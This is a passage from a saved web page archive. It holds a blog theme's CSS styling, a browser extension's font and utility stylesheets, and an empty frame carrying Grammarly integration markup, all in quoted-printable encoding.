t-size: 3.875rem; position: absolute; left: -40px; top: -20px; }

blockquote p:first-of-type { margin-top: 0px; }

blockquote p:last-of-type { margin-bottom: 0px; }

ul, ol { margin-left: 40px; padding: 0px; }

@media (max-width: 684px) {
  ul, ol { margin-left: 20px; }
}

ol ol { list-style-type: lower-alpha; }

.container { flex: 1 1 auto; display: flex; flex-direction: column; justify=
-content: center; text-align: center; }

.content { display: flex; flex-direction: column; flex: 1 1 auto; align-ite=
ms: center; justify-content: center; margin: 0px; }

@media (max-width: 684px) {
  .content { margin-top: 0px; }
}

hr { width: 100%; border: none; height: 1px; background: rgb(220, 220, 220)=
; }

@media (prefers-color-scheme: dark) {
  hr { background: rgb(78, 78, 87); }
}

@media (prefers-color-scheme: light) {
  hr { background: rgb(220, 220, 220); }
}

[data-theme=3D"dark"] hr { background: rgb(78, 78, 87); }

[data-theme=3D"light"] hr { background: rgb(220, 220, 220); }

.hidden { display: none; }

@media (max-width: 684px) {
  .hide-on-phone { display: none; }
}

@media (max-width: 900px) {
  .hide-on-tablet { display: none; }
}

.screen-reader-text { border: 0px; clip: rect(1px, 1px, 1px, 1px); clip-pat=
h: inset(50%); height: 1px; margin: -1px; overflow: hidden; padding: 0px; w=
idth: 1px; position: absolute !important; overflow-wrap: normal !important;=
 }

.screen-reader-text:focus { background-color: rgb(241, 241, 241); border-ra=
dius: 3px; box-shadow: rgba(0, 0, 0, 0.6) 0px 0px 2px 2px; clip-path: none;=
 color: rgb(33, 117, 155); display: block; font-size: 0.875rem; font-weight=
: bold; height: auto; width: auto; top: 5px; left: 5px; line-height: normal=
; padding: 15px 23px 14px; text-decoration: none; z-index: 100000; clip: au=
to !important; }

.background-image { background-repeat: no-repeat; background-attachment: fi=
xed; background-size: cover; background-position: center center; }

.highlight { margin: 30px auto; }

.posts { width: 100%; max-width: 800px; text-align: left; padding: 20px; ma=
rgin: 20px auto; }

@media (max-width: 900px) {
  .posts { max-width: 660px; }
}

.posts:not(:last-of-type) { border-bottom: 1px solid rgb(220, 220, 220); }

@media (prefers-color-scheme: dark) {
  .posts:not(:last-of-type) { border-bottom: 1px solid rgb(78, 78, 87); }
}

@media (prefers-color-scheme: light) {
  .posts:not(:last-of-type) { border-bottom: 1px solid rgb(220, 220, 220); =
}
}

[data-theme=3D"dark"] .posts:not(:last-of-type) { border-bottom: 1px solid =
rgb(78, 78, 87); }

[data-theme=3D"light"] .posts:not(:last-of-type) { border-bottom: 1px solid=
 rgb(220, 220, 220); }

.posts-group { display: flex; margin-bottom: 1.9em; line-height: normal; }

@media (max-width: 900px) {
  .posts-group { display: block; }
}

.posts-list { flex-grow: 1; margin: 0px; padding: 0px; list-style: none; }

.posts .post-title { font-size: 1rem; margin: 5px 0px; }

.posts .post-year { padding-top: 6px; margin-right: 1.8em; font-size: 1.6em=
; opacity: 0.6; }

@media (max-width: 900px) {
  .posts .post-year { margin: -6px 0px 4px; }
}

.posts .post-item { border-bottom: 1px dashed grey; }

.posts .post-item a { display: flex; justify-content: space-between; align-=
items: baseline; padding: 12px 0px; text-decoration: none; }

.posts .post-day { flex-shrink: 0; margin-left: 1em; opacity: 0.6; }

.post { width: 100%; max-width: 800px; text-align: left; padding: 20px; mar=
gin: 20px auto; }

@media (max-width: 900px) {
  .post { max-width: 600px; }
}

.post-date::after { content: "=E2=80=94"; }

.post-title { font-size: 2.625rem; margin: 0px 0px 20px; }

@media (max-width: 684px) {
  .post-title { font-size: 2rem; }
}

.post-title a { text-decoration: none; }

.post-tags { display: block; margin-bottom: 20px; font-size: 1rem; opacity:=
 0.5; }

.post-tags a { text-decoration: none; }

.post-content { margin-top: 30px; }

.post-cover { border-radius: 8px; margin: 40px -50px; width: 860px; max-wid=
th: 860px; overflow: hidden; }

@media (max-width: 900px) {
  .post-cover { margin: 20px 0px; width: 100%; }
}

.post-excerpt { color: grey; font-style: italic; }

.post-info { margin-top: 30px; font-size: 0.8rem; line-height: normal; opac=
ity: 0.6; }

.post-info p { margin: 0.8em 0px; }

.post-info a:hover { border-bottom: 1px solid white; }

.post-info svg { margin-right: 0.8em; }

.post-info .tag { margin-right: 0.5em; }

.post-info .tag::before { content: "#"; }

.post-info .feather { display: inline-block; vertical-align: -0.125em; widt=
h: 1em; height: 1em; }

.post-audio { display: flex; justify-content: center; align-items: center; =
padding-top: 20px; }

.post-audio audio { width: 90%; }

.post .flag { border-radius: 50%; margin: 0px 5px; }

.pagination { margin-top: 20px; }

.pagination__title { display: flex; text-align: center; position: relative;=
 margin: 20px 0px; }

.pagination__title-h { text-align: center; margin: 0px auto; padding: 5px 1=
0px; font-size: 0.8rem; text-transform: uppercase; text-decoration: none; l=
etter-spacing: 0.1em; z-index: 1; background: rgb(255, 255, 255); color: rg=
b(153, 153, 153); }

@media (prefers-color-scheme: dark) {
  .pagination__title-h { background: rgb(35, 36, 37); color: rgb(179, 179, =
189); }
}

@media (prefers-color-scheme: light) {
  .pagination__title-h { background: rgb(255, 255, 255); color: rgb(153, 15=
3, 153); }
}

[data-theme=3D"dark"] .pagination__title-h { background: rgb(35, 36, 37); c=
olor: rgb(179, 179, 189); }

[data-theme=3D"light"] .pagination__title-h { background: rgb(255, 255, 255=
); color: rgb(153, 153, 153); }

.pagination__title hr { position: absolute; left: 0px; right: 0px; width: 1=
00%; margin-top: 15px; z-index: 0; }

.pagination__buttons { display: flex; align-items: center; justify-content:=
 center; }

.pagination__buttons a { text-decoration: none; font-weight: bold; }

.button { position: relative; display: inline-flex; align-items: center; ju=
stify-content: center; font-size: 1rem; font-weight: 600; border-radius: 8p=
x; max-width: 40%; padding: 0px; cursor: pointer; appearance: none; backgro=
und: rgb(234, 234, 234); }

@media (prefers-color-scheme: dark) {
  .button { background: rgb(59, 61, 66); }
}

@media (prefers-color-scheme: light) {
  .button { background: rgb(234, 234, 234); }
}

[data-theme=3D"dark"] .button { background: rgb(59, 61, 66); }

[data-theme=3D"light"] .button { background: rgb(234, 234, 234); }

.button + .button { margin-left: 10px; }

.button a { display: flex; padding: 8px 16px; text-decoration: none; text-o=
verflow: ellipsis; white-space: nowrap; overflow: hidden; }

.button__text { text-overflow: ellipsis; white-space: nowrap; overflow: hid=
den; }

.button.next .button__icon { margin-left: 8px; }

.button.previous .button__icon { margin-right: 8px; }

.footer { padding: 40px 20px; flex-grow: 0; color: rgb(153, 153, 153); }

.footer__inner { display: flex; align-items: center; justify-content: cente=
r; margin: 0px auto; width: 760px; max-width: 100%; }

@media (max-width: 900px) {
  .footer__inner { flex-direction: column; }
}

.footer__content { display: flex; flex-direction: row; align-items: center;=
 font-size: 1rem; color: rgb(153, 153, 153); }

@media (max-width: 900px) {
  .footer__content { flex-direction: column; margin-top: 10px; }
}

.footer__content > :not(:last-child)::after { content: "=E2=80=A2"; padding=
: 0px 5px; }

@media (max-width: 900px) {
  .footer__content > :not(:last-child)::after { content: ""; padding: 0px; =
}
}

.footer__content > :last-child { padding: 0px; }

@media (max-width: 900px) {
  .footer__content > :last-child { padding: 0px; }
}

.sharing-buttons { display: flex; flex-wrap: wrap; justify-content: space-b=
etween; }

.sharing-buttons .resp-sharing-button__icon, .sharing-buttons .resp-sharing=
-button__link { display: inline-block; }

.sharing-buttons .resp-sharing-button__link { text-decoration: none; margin=
: 0.5em; }

.sharing-buttons .resp-sharing-button { border-radius: 5px; transition: all=
 25ms ease-out 0s; padding: 0.5em 0.75em; font-family: "Helvetica Neue", He=
lvetica, Arial, sans-serif; }

.sharing-buttons .resp-sharing-button__icon svg { width: 1em; height: 1em; =
margin-right: 0.4em; vertical-align: top; }

.sharing-buttons .resp-sharing-button--small svg { margin: 0px; vertical-al=
ign: middle; }

.post-content table { border-collapse: collapse; margin: 25px auto; font-si=
ze: 0.9em; min-width: 400px; max-width: 100%; }

.post-content table th, .post-content table td { padding: 12px 15px; border=
: 1px solid rgb(220, 220, 220); }

@media (prefers-color-scheme: dark) {
  .post-content table th, .post-content table td { border: 1px solid rgb(78=
, 78, 87); }
}

@media (prefers-color-scheme: light) {
  .post-content table th, .post-content table td { border: 1px solid rgb(22=
0, 220, 220); }
}

[data-theme=3D"dark"] .post-content table th, [data-theme=3D"dark"] .post-c=
ontent table td { border: 1px solid rgb(78, 78, 87); }

[data-theme=3D"light"] .post-content table th, [data-theme=3D"light"] .post=
-content table td { border: 1px solid rgb(220, 220, 220); }

.post-content table thead tr { text-align: left; background-color: rgb(220,=
 220, 220); color: rgb(34, 34, 34); }

@media (prefers-color-scheme: dark) {
  .post-content table thead tr { background-color: rgb(78, 78, 87); color: =
rgb(169, 169, 179); }
}

@media (prefers-color-scheme: light) {
  .post-content table thead tr { background-color: rgb(220, 220, 220); colo=
r: rgb(34, 34, 34); }
}

[data-theme=3D"dark"] .post-content table thead tr { background-color: rgb(=
78, 78, 87); color: rgb(169, 169, 179); }

[data-theme=3D"light"] .post-content table thead tr { background-color: rgb=
(220, 220, 220); color: rgb(34, 34, 34); }

.post-content table tbody tr { border: 1px solid rgb(220, 220, 220); }

@media (prefers-color-scheme: dark) {
  .post-content table tbody tr { border: 1px solid rgb(78, 78, 87); }
}

@media (prefers-color-scheme: light) {
  .post-content table tbody tr { border: 1px solid rgb(220, 220, 220); }
}

[data-theme=3D"dark"] .post-content table tbody tr { border: 1px solid rgb(=
78, 78, 87); }

[data-theme=3D"light"] .post-content table tbody tr { border: 1px solid rgb=
(220, 220, 220); }

.btn-404 svg { vertical-align: middle; display: inline-block; margin-right:=
 5px; }

.btn-404 a { margin: 0px 10px; }
------MultipartBoundary--p61HJD2NYwiHvHjOXV9H5YZph1MCblr7YDCNj44J8U----
Content-Type: text/css
Content-Transfer-Encoding: quoted-printable
Content-Location: chrome-extension://bbpokcagpggnekcmamgdieebhpkjmljm/css/fonts.css

@charset "utf-8";

@font-face { font-family: Nunito; font-style: normal; font-weight: 400; src=
: local("Nunito Regular"), local("Nunito-Regular"), url("chrome-extension:/=
/bbpokcagpggnekcmamgdieebhpkjmljm/assets/fonts/nunito-v12-latin-regular.wof=
f2") format("woff2"), url("chrome-extension://bbpokcagpggnekcmamgdieebhpkjm=
ljm/assets/fonts/nunito-v12-latin-regular.woff") format("woff"), url("chrom=
e-extension://bbpokcagpggnekcmamgdieebhpkjmljm/assets/fonts/nunito-v12-lati=
n-regular.ttf") format("truetype"); }

@font-face { font-family: Nunito; font-style: normal; font-weight: 600; src=
: local("Nunito SemiBold"), local("Nunito-SemiBold"), url("chrome-extension=
://bbpokcagpggnekcmamgdieebhpkjmljm/assets/fonts/nunito-v12-latin-600.woff2=
") format("woff2"), url("chrome-extension://bbpokcagpggnekcmamgdieebhpkjmlj=
m/assets/fonts/nunito-v12-latin-600.woff") format("woff"), url("chrome-exte=
nsion://bbpokcagpggnekcmamgdieebhpkjmljm/assets/fonts/nunito-v12-latin-600.=
ttf") format("truetype"); }

@font-face { font-family: Nunito; font-style: normal; font-weight: 700; src=
: local("Nunito Bold"), local("Nunito-Bold"), url("chrome-extension://bbpok=
cagpggnekcmamgdieebhpkjmljm/assets/fonts/nunito-v12-latin-700.woff2") forma=
t("woff2"), url("chrome-extension://bbpokcagpggnekcmamgdieebhpkjmljm/assets=
/fonts/nunito-v12-latin-700.woff") format("woff"), url("chrome-extension://=
bbpokcagpggnekcmamgdieebhpkjmljm/assets/fonts/nunito-v12-latin-700.ttf") fo=
rmat("truetype"); }

@font-face { font-family: Nunito; font-style: normal; font-weight: 800; src=
: local("Nunito ExtraBold"), local("Nunito-ExtraBold"), url("chrome-extensi=
on://bbpokcagpggnekcmamgdieebhpkjmljm/assets/fonts/nunito-v12-latin-800.wof=
f2") format("woff2"), url("chrome-extension://bbpokcagpggnekcmamgdieebhpkjm=
ljm/assets/fonts/nunito-v12-latin-800.woff") format("woff"), url("chrome-ex=
tension://bbpokcagpggnekcmamgdieebhpkjmljm/assets/fonts/nunito-v12-latin-80=
0.ttf") format("truetype"); }
------MultipartBoundary--p61HJD2NYwiHvHjOXV9H5YZph1MCblr7YDCNj44J8U----
Content-Type: text/css
Content-Transfer-Encoding: quoted-printable
Content-Location: chrome-extension://bbpokcagpggnekcmamgdieebhpkjmljm/css/global.css

@charset "utf-8";

* { padding: 0px; margin: 0px; box-sizing: border-box; border: 0px; list-st=
yle: none; font-family: Nunito, sans-serif, arial; outline: 0px; text-align=
: left; }

a { text-decoration: none; color: rgb(30, 136, 229); }

.no-select { user-select: none; }

.hbg-dark-800 { background: rgb(25, 25, 31); }

.hbg-dark-700 { background: rgb(32, 33, 41); }

.hbg-dark-600 { background: rgb(36, 37, 45); }

.hbg-dark-500 { background: rgb(45, 47, 58); }

.hbg-blue-700 { background: rgb(25, 118, 210); }

.hbg-blue-600 { background: rgb(30, 136, 229); }

.hbg-blue-500 { background: rgb(33, 150, 243); }

.hbg-red-700 { background: rgb(211, 47, 47); }

.hbg-red-600 { background: rgb(229, 57, 53); }

.hbg-red-500 { background: rgb(244, 67, 54); }

.hbg-purple-700 { background: rgb(123, 31, 162); }

.hbg-purple-600 { background: rgb(142, 36, 170); }

.hbg-purple-500 { background: rgb(156, 39, 176); }

.hcolor-red-700 { color: rgb(211, 47, 47); }

.hcolor-red-600 { color: rgb(229, 57, 53); }

.hcolor-red-500 { color: rgb(244, 67, 54); }

.hcolor-white { color: rgb(255, 255, 255); }

.hcolor-white.hover { color: rgba(255, 255, 255, 0.6); transition: color 0.=
2s ease-in-out 0s; }

.hcolor-white.hover:hover { color: rgb(255, 255, 255); }

.hcolor-purple-700 { color: rgb(123, 31, 162); }

.hcolor-purple-600 { color: rgb(142, 36, 170); }

.hcolor-purple-500 { color: rgb(156, 39, 176); }

.hcolor-blue-700 { color: rgb(25, 118, 210); }

.hcolor-blue-600 { color: rgb(30, 136, 229); }

.hcolor-blue-500 { color: rgb(33, 150, 243); }

.hbr { border-radius: 0.2rem; }

.hbr-top-left { border-top-left-radius: 0.2rem; }

.hbr-top-right { border-top-right-radius: 0.2rem; }

.hbr-bottom-left { border-bottom-left-radius: 0.2rem; }

.hbr-bottom-right { border-bottom-right-radius: 0.2rem; }

.flex { display: flex; }

.flex.center { align-items: center; justify-content: center; }

.flex.center-hor { align-items: center; }

.space { flex: 1 1 0%; }

.pointer { cursor: pointer; }

.loader { border-width: 4px; border-style: solid; border-color: rgb(255, 25=
5, 255) rgba(255, 255, 255, 0.2) rgba(255, 255, 255, 0.2); border-image: in=
itial; border-radius: 50%; width: 40px; height: 40px; animation: 0.6s linea=
r 0s infinite normal none running spin; }

@keyframes spin {=20
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}

.checkbox { margin-top: 1rem; display: flex; align-items: center; cursor: p=
ointer; user-select: none; }

.checkbox input { display: none; }

.checkbox .checkmark { width: 18px; height: 18px; border-radius: 0.2rem; ba=
ckground: rgba(255, 255, 255, 0.8); display: flex; align-items: center; jus=
tify-content: center; }

.checkbox .checkmark svg { color: rgb(255, 255, 255); width: 14px; height: =
14px; }

.checkbox .check-info { margin-left: 1rem; }

.checkbox .check-info .check-title { color: rgb(255, 255, 255); font: 14px =
Nunito; display: block; }

.checkbox .check-info .check-message { color: rgba(255, 255, 255, 0.6); fon=
t: 14px Nunito; display: block; }

.checkbox:hover .checkmark { background: rgb(255, 255, 255); }

.checkbox[active=3D"true"] .checkmark { background: rgb(30, 136, 229); }
------MultipartBoundary--p61HJD2NYwiHvHjOXV9H5YZph1MCblr7YDCNj44J8U----
Content-Type: text/html
Content-ID: <frame-B7E5E0322D73DDCFC2C2CE570D61EE37@mhtml.blink>
Content-Transfer-Encoding: quoted-printable

<html><head><meta http-equiv=3D"Content-Type" content=3D"text/html; charset=
=3DUTF-8"></head><body data-new-gr-c-s-check-loaded=3D"14.1117.0" data-gr-e=
xt-installed=3D""></body><grammarly-desktop-integration data-grammarly-shad=
ow-root=3D"true"><template shadowmode=3D"open"><div aria-label=3D"grammarly=
-integration" role=3D"group" tabindex=3D"-1" class=3D"grammarly-desktop-int=
egration" data-content=3D"{&quot;mode&quot;:&quot;full&quot;,&quot;isActive=
&quot;:true,&quot;isUserDisabled&quot;:false}"></div></template></grammarly=
-desktop-integration></html>
------MultipartBoundary--p61HJD2NYwiHvHjOXV9H5YZph1MCblr7YDCNj44J8U------
